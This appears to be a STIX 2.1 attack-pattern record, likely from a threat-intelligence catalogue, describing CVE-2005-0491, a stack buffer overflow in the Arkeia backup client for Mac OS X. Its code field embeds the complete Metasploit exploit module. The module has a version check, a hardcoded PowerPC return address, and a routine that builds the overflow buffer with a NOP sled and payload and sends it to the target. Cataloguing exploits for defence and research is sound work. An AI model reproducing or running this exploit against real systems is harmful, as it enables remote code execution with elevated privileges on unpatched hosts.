{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b6ed2a59-101f-467b-8699-f68815c911b2",
    "created": "2024-08-14T16:34:34.883466Z",
    "modified": "2024-08-14T16:34:34.88347Z",
    "name": "Arkeia Backup Client Type 77 Overflow (Mac OS X)",
    "description": " This module exploits a stack buffer overflow in the Arkeia backup client for the Mac OS X platform. This vulnerability affects all versions up to and including 5.3.3 and has been tested with Arkeia 5.3.1 on Mac OS X 10.3.5. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/osx/arkeia/type77.rb",
            "external_id": "type77.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2005-0491"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::Arkeia\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Arkeia Backup Client Type 77 Overflow (Mac OS X)',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in the Arkeia backup\n        client for the Mac OS X platform. This vulnerability affects\n        all versions up to and including 5.3.3 and has been tested\n        with Arkeia 5.3.1 on Mac OS X 10.3.5.\n      },\n      'Author'         => [ 'hdm' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2005-0491'],\n          [ 'OSVDB', '14011'],\n          [ 'BID', '12594']\n        ],\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'Space'    => 1000,\n          'BadChars' => \"\\x00\",\n          'MinNops'  => 700,\n          'Compat'   =>\n          {\n            'ConnectionType' => '-find',\n          },\n        },\n      'Platform'       => %w{ osx },\n      'Targets'        =>\n        [\n          [\n            'Arkeia 5.3.1 Stack Return (boot)',\n            {\n              'Platform' => 'osx',\n              'Arch'     => ARCH_PPC,\n              'Ret'      => 0xbffff910,\n            },\n          ],\n        ],\n      'DisclosureDate' => '2005-02-18',\n      'DefaultTarget' => 0))\n  end\n\n  def check\n    info = arkeia_info()\n    if !(info and info['Version'])\n      return Exploit::CheckCode::Safe\n    end\n\n    vprint_status(\"Arkeia Server Information:\")\n    info.each_pair { |k,v|\n      vprint_status(\"   #{k + (\" \" * (30-k.length))} = #{v}\")\n    }\n\n    if (info['System'] !~ /Darwin/)\n      vprint_status(\"This module only supports Mac OS X targets\")\n      return Exploit::CheckCode::Detected\n    end\n\n    if (info['Version'] =~ /Backup (4\\.|5\\.([012]\\.|3\\.[0123]$))/)\n      return Exploit::CheckCode::Appears\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    connect\n\n    # Request has to be big enough to find and small enough\n    # not to write off the end of the stack. If we write too\n    # far down, we also smash env[], which causes a crash in\n    # getenv() before our function returns.\n\n    head = \"\\x00\\x4d\\x00\\x03\\x00\\x01\\xff\\xff\"\n    head[6, 2] = [1200].pack('n')\n\n    buf = rand_text_english(1200, payload_badchars)\n\n    # Return back to the stack either directly or via system lib\n    buf[0, 112] = [target.ret].pack('N') * (112/4)\n\n    # Huge nop slep followed by the payload\n    buf[112, payload.encoded.length] = payload.encoded\n\n    print_status(\"Sending request...\")\n    begin\n      sock.put(head)\n      sock.put(buf)\n      sock.get_once\n    rescue IOError, EOFError => e\n      print_status(\"Exception: #{e.class}:#{e}\")\n    end\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2005-02-18",
    "x_mitre_platforms": [
        "osx'"
    ]
}